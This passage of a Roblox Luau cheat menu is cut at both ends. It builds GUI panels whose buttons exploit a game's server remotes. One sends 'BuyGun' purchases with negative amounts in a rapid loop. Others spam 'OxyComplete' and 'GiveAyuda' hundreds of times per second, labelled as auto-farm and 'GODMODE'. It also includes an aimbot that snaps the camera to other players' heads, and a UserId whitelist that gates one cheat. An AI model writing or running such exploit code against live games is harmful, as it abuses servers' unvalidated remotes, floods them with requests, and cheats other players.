local function removePlayerFromList(player)
	if playerButtons[player] then
		playerButtons[player]:Destroy()
		playerButtons[player] = nil
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	addPlayerToList(player)
end

Players.PlayerAdded:Connect(addPlayerToList)
Players.PlayerRemoving:Connect(removePlayerFromList)

print("MONSY")

--// 🔥 KEYBIND: PRESS P TO SHOW/HIDE
local open = true

UIS.InputBegan:Connect(function(key, typing)
	if typing then return end
	if key.KeyCode == Enum.KeyCode.P then
		open = not open
		ListFrame.Visible = open
	end
end)
end)

addMainMenuButton("SPAWN GUN (SANTINO)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 290, 0, 290)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {".50 Pistol", "SP"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.UwUCafeFolder.BuyGun:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("SPAWN OXY (SANTINO)", function()
	local args = {}

game:GetService("ReplicatedStorage"):WaitForChild("GiveAyuda", 9e9):FireServer(unpack(args))
end)

addMainMenuButton("SPAWN POINT REFRESH (SANTINO)", function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Variables
local savedWaypoint = nil

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame — PURE WHITE
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 170)
frame.Position = UDim2.new(0.5, -100, 0.5, -85)
frame.BackgroundColor3 = Color3.new(1, 1, 1)        -- PURE WHITE
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded corners
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

-- Title — BLACK TEXT
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.BackgroundTransparency = 1
title.Text = "AUTO WAYPOINT"
title.TextColor3 = Color3.new(0,0,0)                -- BLACK TEXT
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = frame

-- Function to create buttons (WHITE THEME)
local function createButton(text, order)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.8, 0, 0, 35)
    button.Position = UDim2.new(0.1, 0, 0, 40 + (order * 40))
    button.BackgroundColor3 = Color3.fromRGB(240, 240, 240)  -- LIGHT GRAY (para kita)
    button.TextColor3 = Color3.new(0,0,0)                    -- BLACK TEXT
    button.Text = text
    button.Font = Enum.Font.Roboto
    button.TextSize = 16
    button.BorderSizePixel = 1
    button.BorderColor3 = Color3.new(0,0,0)                  -- BLACK BORDER

    local btnCorner = Instance.new("UICorner", button)
    btnCorner.CornerRadius = UDim.new(0, 10)
    button.Parent = frame
    return button
end

-- Create Buttons
local setWaypointBtn = createButton("Set Waypoint", 0)
local refreshBtn = createButton("Refresh", 1)
local deleteWaypointBtn = createButton("Delete Waypoint", 2)

--// BUTTON FUNCTIONS (EXACT SAME)

-- SET WAYPOINT
setWaypointBtn.MouseButton1Click:Connect(function()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then
        savedWaypoint = hrp.Position
        player:WaitForChild("PlayerGui"):SetCore("SendNotification", {
            Title = "Waypoint Set",
            Text = "Respawn point saved!",
            Duration = 2
        })
    end
end)

-- REFRESH BUTTON
refreshBtn.MouseButton1Click:Connect(function()
    local args = { [1] = "Boy" }
    ReplicatedStorage:WaitForChild("SaveCharacterEvent", 9e9):FireServer(unpack(args))
end)

-- DELETE WAYPOINT
deleteWaypointBtn.MouseButton1Click:Connect(function()
    savedWaypoint = nil
    player:WaitForChild("PlayerGui"):SetCore("SendNotification", {
        Title = "Waypoint Deleted",
        Text = "Respawn point removed!",
        Duration = 2
    })
end)

--// RESPAWN HANDLER (EXACT SAME)
player.CharacterAdded:Connect(function(char)
    if savedWaypoint then
        char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(savedWaypoint)
    end
end)
end)

addMainMenuButton("AUTO OXY (SANTINO)", function()
	 local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

----------------------------------------------------------------
-- GUI
----------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 130)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)

-- Title
local title = Instance.new("TextLabel")
title.Parent = frame
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255,255,255)

----------------------------------------------------------------
-- TOGGLE BUTTON
----------------------------------------------------------------
local toggle = Instance.new("TextButton")
toggle.Parent = frame
toggle.Size = UDim2.new(0, 200, 0, 50)
toggle.Position = UDim2.new(0.5, -100, 0, 60)
toggle.BackgroundColor3 = Color3.fromRGB(0,0,0)
toggle.BorderSizePixel = 0
toggle.Text = "OFF"
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 20
toggle.TextColor3 = Color3.fromRGB(255,255,255)

Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 12)

-- Status dot
local dot = Instance.new("Frame")
dot.Parent = toggle
dot.Size = UDim2.new(0, 12, 0, 12)
dot.Position = UDim2.new(0, 10, 0.5, -6)
dot.BackgroundColor3 = Color3.fromRGB(170,170,170)
dot.BorderSizePixel = 0
Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

----------------------------------------------------------------
-- LOGIC
----------------------------------------------------------------
local isOn = false
local thread = nil

local function startOxy()
	if thread then return end
	thread = task.spawn(function()
		while isOn do
			pcall(function()
				oxyRemote:FireServer("APOY", -1)
			end)
			task.wait(0.001) -- spam speed
		end
		thread = nil
	end)
end

local function stopOxy()
	isOn = false
end

toggle.MouseButton1Click:Connect(function()
	isOn = not isOn

	toggle.Text = isOn and "ON" or "OFF"
	dot.BackgroundColor3 = isOn and Color3.fromRGB(255,40,140) or Color3.fromRGB(170,170,170)

	if isOn then
		startOxy()
	else
		stopOxy()
	end
end)

----------------------------------------------------------------
-- DRAGGABLE
----------------------------------------------------------------
local dragging = false
local dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)
end)

addMainMenuButton("GODMODE (BETA)", function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

----------------------------------------------------------------
-- GUI
----------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 130)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Parent = screenGui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)

local title = Instance.new("TextLabel")
title.Parent = frame
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "GODMODE OXY"
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(0,0,0) -- BLACK TEXT NOW

----------------------------------------------------------------
-- TOGGLE BUTTON
----------------------------------------------------------------
local toggle = Instance.new("TextButton")
toggle.Parent = frame
toggle.Size = UDim2.new(0, 200, 0, 50)
toggle.Position = UDim2.new(0.5, -100, 0, 60)
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.BorderSizePixel = 0
toggle.Text = "OFF"
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 20
toggle.TextColor3 = Color3.fromRGB(0,0,0) -- BLACK TEXT NOW

Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 12)

local dot = Instance.new("Frame")
dot.Parent = toggle
dot.Size = UDim2.new(0, 12, 0, 12)
dot.Position = UDim2.new(0, 10, 0.5, -6)
dot.BackgroundColor3 = Color3.fromRGB(170,170,170)
dot.BorderSizePixel = 0
Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

----------------------------------------------------------------
-- LOGIC
----------------------------------------------------------------
local isOn = false
local thread = nil

local function startOxy()
	if thread then return end
	thread = task.spawn(function()
		while isOn do
			pcall(function()
				-- 5 FIRE IN ONE LOOP
				for i = 1,100 do
					oxyRemote:FireServer("APOY", -1)
				end
			end)
			task.wait(0.0001)
		end
		thread = nil
	end)
end

toggle.MouseButton1Click:Connect(function()
	isOn = not isOn

	toggle.Text = isOn and "ON" or "OFF"
	toggle.TextColor3 = isOn and Color3.fromRGB(255,0,0) or Color3.fromRGB(0,0,0)

	dot.BackgroundColor3 = isOn and Color3.fromRGB(255,0,0) or Color3.fromRGB(170,170,170)

	if isOn then
		startOxy()
	end
end)

----------------------------------------------------------------
-- DRAG
----------------------------------------------------------------
local dragging = false
local dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PERSONAL SCRIPT FOR (NOCTA)", function()
	--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

--// AIMBOT SETTINGS
local AimEnabled = false
local AimbotMode = "Instant"
local Smoothness = 1
local BaseFOV = 5

--// CROSSHAIR DATA
local Crosshairs = {
    {id = 1827745860, name = "Dot", fovMult = 0.5},
    {id = 5998624788, name = "Circle", fovMult = 1.2},
    {id = 749187669, name = "Cross", fovMult = 1.0},
    {id = 1469004289, name = "Small X", fovMult = 0.7},
    {id = 11722368344, name = "Big Circle", fovMult = 2.0},
    {id = 2614612882, name = "Thin Cross", fovMult = 0.8},
    {id = 749187664, name = "Plus", fovMult = 0.9},
    {id = 251435889, name = "Classic", fovMult = 1.1},
    {id = 5143056985, name = "Red Dot", fovMult = 0.6},
    {id = 11759202791, name = "Holo", fovMult = 1.5},
    {id = 1478500977, name = "Star", fovMult = 1.3},
    {id = 11726821301, name = "Neon", fovMult = 1.1},
    {id = 5536063313, name = "Target", fovMult = 1.4},
    {id = 11746928636, name = "Scope", fovMult = 1.8},
    {id = 11759198682, name = "Ring", fovMult = 1.6},
    {id = 11826465934, name = "Hex", fovMult = 1.0},
    {id = 11927593271, name = "Glow", fovMult = 1.7},
    {id = 11867351018, name = "Tech", fovMult = 1.2},
    {id = 4048495272,   name = "Pulse", fovMult = 0.9},
    {id = 10891594364,  name = "Vortex", fovMult = 1.4},
    {id = 5998624778,   name = "Mini Dot", fovMult = 0.6},
    {id = 2207556774,   name = "Arrow", fovMult = 1.1},
    {id = 426730675,    name = "Bracket", fovMult = 1.0},
    {id = 11754490336,  name = "Hollow", fovMult = 1.3},
    {id = 10868459554,  name = "Trident", fovMult = 1.2},
    {id = 11719595129,  name = "Blade", fovMult = 0.8},
    {id = 1489774665,   name = "Nexus", fovMult = 1.5},
    {id = 6079707648,   name = "Core", fovMult = 0.7},
    {id = 11390723044,  name = "Phantom", fovMult = 1.6},
    {id = 10878218322,  name = "Ghost", fovMult = 1.1},
    {id = 11722081515,  name = "Razor", fovMult = 0.9},
    {id = 11390723057,  name = "Spike", fovMult = 1.0},
    {id = 251497633,    name = "Retro", fovMult = 1.2},
    {id = 11722153703,  name = "Fusion", fovMult = 1.7},
    {id = 8680062686,   name = "Nova", fovMult = 1.4},
    {id = 11350518862,  name = "Apex", fovMult = 1.3},
    {id = 11722554017,  name = "Zenith", fovMult = 1.8},
    {id = 8360620314,   name = "Echo", fovMult = 1.0},
    {id = 11988231127,  name = "Spectre", fovMult = 1.5},
    {id = 11830989304,  name = "Cipher", fovMult = 1.2},
    {id = 11759293285,  name = "Omega", fovMult = 1.6},
    {id = 11754499452,  name = "Sigma", fovMult = 0.8},
    {id = 2555584348,   name = "Delta", fovMult = 1.1},
    {id = 11717828297,  name = "Gamma", fovMult = 1.3},
    {id = 11724945237,  name = "Theta", fovMult = 1.4},
    {id = 11733801922,  name = "Kappa", fovMult = 1.0},
    {id = 11733622734,  name = "Lambda", fovMult = 1.2},
    {id = 11754273720,  name = "Mu", fovMult = 0.9},
    {id = 11754490994,  name = "Nu", fovMult = 1.1},
    {id = 11756696859,  name = "Xi", fovMult = 1.5},
    {id = 11802094220,  name = "Omicron", fovMult = 1.3},
    {id = 11867337948,  name = "Pi", fovMult = 1.0},
    {id = 11915656516,  name = "Rho", fovMult = 1.4},
    {id = 11986603133,  name = "Tau", fovMult = 1.7}
}

local CurrentCrosshair = Crosshairs[1]
local CurrentFOV = BaseFOV * CurrentCrosshair.fovMult

--// GUI SETUP
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

--// CROSSHAIR
local crosshair = Instance.new("ImageLabel")
crosshair.Name = ""
crosshair.Image = "rbxassetid://" .. tostring(CurrentCrosshair.id)
crosshair.Size = UDim2.new(0, 32, 0, 32)
crosshair.AnchorPoint = Vector2.new(0.5, 0.5)
crosshair.Position = UDim2.new(0.5, 0, 0.46, 0)
crosshair.BackgroundTransparency = 1
crosshair.ZIndex = 10
crosshair.Active = false
crosshair.Parent = screenGui

--// HIDE CROSSHAIR (I)
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.I then
		crosshair.Visible = not crosshair.Visible
	end
end)

--// MAIN FRAME
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 340, 0, 560)
mainFrame.Position = UDim2.new(0, 20, 0.5, -280)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

--// TITLE
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "CROSSHAIR AIMBOT - GOMA"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = title

--// SCROLL FRAME
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -20, 1, -160)
scrollFrame.Position = UDim2.new(0, 10, 0, 55)
scrollFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
scrollFrame.ScrollBarThickness = 6
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
scrollFrame.BorderSizePixel = 0
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.Parent = mainFrame

local layout = Instance.new("UIGridLayout")
layout.CellSize = UDim2.new(0, 85, 0, 95)
layout.CellPadding = UDim2.new(0, 12, 0, 12)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrollFrame

--// SETTINGS FRAME
local settingsFrame = Instance.new("Frame")
settingsFrame.Size = UDim2.new(1, -20, 0, 110)
settingsFrame.Position = UDim2.new(0, 10, 1, -120)
settingsFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
settingsFrame.BorderSizePixel = 0
settingsFrame.Parent = mainFrame

local settingsCorner = Instance.new("UICorner")
settingsCorner.CornerRadius = UDim.new(0, 10)
settingsCorner.Parent = settingsFrame

-- Mode Label
local modeLabel = Instance.new("TextLabel")
modeLabel.Text = "Aimbot Mode:"
modeLabel.TextColor3 = Color3.fromRGB(0,0,0)
modeLabel.Size = UDim2.new(0, 120, 0, 25)
modeLabel.Position = UDim2.new(0, 10, 0, 10)
modeLabel.BackgroundTransparency = 1
modeLabel.Font = Enum.Font.Roboto
modeLabel.TextSize = 14
modeLabel.Parent = settingsFrame

-- Mode Dropdown Button
local modeDropdown = Instance.new("TextButton")
modeDropdown.Text = "Mode: Instant"
modeDropdown.Size = UDim2.new(0, 160, 0, 25)
modeDropdown.Position = UDim2.new(0, 140, 0, 10)
modeDropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
modeDropdown.TextColor3 = Color3.fromRGB(0,0,0)
modeDropdown.Font = Enum.Font.Roboto
modeDropdown.TextSize = 14
modeDropdown.Parent = settingsFrame

local dropdownCorner = Instance.new("UICorner")
dropdownCorner.CornerRadius = UDim.new(0, 8)
dropdownCorner.Parent = modeDropdown

-- Toggle Mode Function
modeDropdown.MouseButton1Click:Connect(function()
	if AimbotMode == "Instant" then
		AimbotMode = "Smooth"
		modeDropdown.Text = "Mode: Smooth"
	else
		AimbotMode = "Instant"
		modeDropdown.Text = "Mode: Instant"
	end
end)

-- Smoothness Input
local smoothLabel = Instance.new("TextLabel")
smoothLabel.Text = "Smoothness:"
smoothLabel.TextColor3 = Color3.fromRGB(0,0,0)
smoothLabel.Size = UDim2.new(0, 120, 0, 25)
smoothLabel.Position = UDim2.new(0, 10, 0, 45)
smoothLabel.BackgroundTransparency = 1
smoothLabel.Font = Enum.Font.Roboto
smoothLabel.TextSize = 14
smoothLabel.Parent = settingsFrame

local smoothBox = Instance.new("TextBox")
smoothBox.Size = UDim2.new(0, 160, 0, 25)
smoothBox.Position = UDim2.new(0, 140, 0, 45)
smoothBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
smoothBox.TextColor3 = Color3.fromRGB(0,0,0)
smoothBox.PlaceholderText = tostring(Smoothness)
smoothBox.Font = Enum.Font.Roboto
smoothBox.TextSize = 14
smoothBox.Parent = settingsFrame

local smoothCorner = Instance.new("UICorner")
smoothCorner.CornerRadius = UDim.new(0, 8)
smoothCorner.Parent = smoothBox

-- Update Smoothness on Input
smoothBox.FocusLost:Connect(function(enterPressed)
	local val = tonumber(smoothBox.Text)
	if val and val > 0 then
		Smoothness = math.clamp(val, 0.01, 1)
	end
end)

-- STATUS LABEL
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 35)
statusLabel.Position = UDim2.new(0, 10, 1, -45)
statusLabel.BackgroundColor3 = Color3.fromRGB(255,255,255)
statusLabel.TextColor3 = Color3.fromRGB(0,0,0)
statusLabel.Text = "Aimbot: OFF | FOV: " .. CurrentFOV
statusLabel.Font = Enum.Font.Roboto
statusLabel.TextSize = 16
statusLabel.Parent = mainFrame

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 8)
statusCorner.Parent = statusLabel

-- CROSSHAIR BUTTONS
local function createCrosshairButton(data)
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
    frame.BorderSizePixel = 1
    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local img = Instance.new("ImageLabel")
    img.Size = UDim2.new(1, -8, 0.75, -8)
    img.Position = UDim2.new(0, 4, 0, 4)
    img.BackgroundTransparency = 1
    img.Image = "rbxassetid://" .. tostring(data.id)
    img.ImageColor3 = Color3.fromRGB(255, 255, 255)
    img.Parent = frame

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0.25, 0)
    nameLabel.Position = UDim2.new(0, 0, 0.75, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = data.name
    nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
    nameLabel.Font = Enum.Font.Roboto
    nameLabel.TextSize = 13
    nameLabel.Parent = frame

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Text = ""
    button.Parent = frame

    button.MouseButton1Click:Connect(function()
        CurrentCrosshair = data
        CurrentFOV = BaseFOV * data.fovMult
        crosshair.Image = "rbxassetid://" .. tostring(data.id)
        statusLabel.Text = "Aimbot: " .. (AimEnabled and "ON" or "OFF") .. " | FOV: " .. math.floor(CurrentFOV * 10) / 10
    end)

    frame.Parent = scrollFrame
end

for _, data in ipairs(Crosshairs) do
	createCrosshairButton(data)
end

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
end)

--// AIMBOT LOGIC
local function getTargetPart(character)
	return character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
end

local function getClosestPlayer()
	local closest, shortest = nil, math.huge
	if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return nil end
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character then
			local part = getTargetPart(p.Character)
			local hum = p.Character:FindFirstChildOfClass("Humanoid")
			if part and hum and hum.Health > 0 then
				local pos, visible = Camera:WorldToScreenPoint(part.Position)
				if visible then
					local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
					if dist < CurrentFOV * 20 and dist < shortest then
						closest, shortest = part.Position, dist
					end
				end
			end
		end
	end
	return closest
end

local function aimAtTarget()
	local t = getClosestPlayer()
	if t then
		if AimbotMode == "Instant" then
			Camera.CFrame = CFrame.new(Camera.CFrame.Position, t)
		else
			Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, t), Smoothness)
		end
	end
end

-- RIGHT-CLICK TOGGLE AIMBOT
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		AimEnabled = true
		statusLabel.Text = "Aimbot: ON | FOV: " .. math.floor(CurrentFOV * 10) / 10
	end
end)

UserInputService.InputEnded:Connect(function(input, gp)
	if gp then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		AimEnabled = false
		statusLabel.Text = "Aimbot: OFF | FOV: " .. math.floor(CurrentFOV * 10) / 10
	end
end)

RunService.RenderStepped:Connect(function()
	if AimEnabled then
		aimAtTarget()
	end
end)

-- TOGGLE MENU (INSERT)
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.Insert then
		mainFrame.Visible = not mainFrame.Visible
	end
end)

print("ILOVEYOU MONSY !")
end)

addMainMenuButton("BLOODLINE SPAWN GUN (SANTINO)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local player = Players.LocalPlayer

local WhitelistedUserIds = {
    8172987891,  
    4698920760,
	2995386371,
	6092019187,
    1905719523,
	3449979629,
}

local userId = player.UserId
local isWhitelisted = false

for _, id in ipairs(WhitelistedUserIds) do
    if id == userId then
        isWhitelisted = true
        break
    end
end

if not isWhitelisted then
    warn("Access denied: UserId " .. userId .. " is not whitelisted.")
    return  -- Stop ang script dito
end

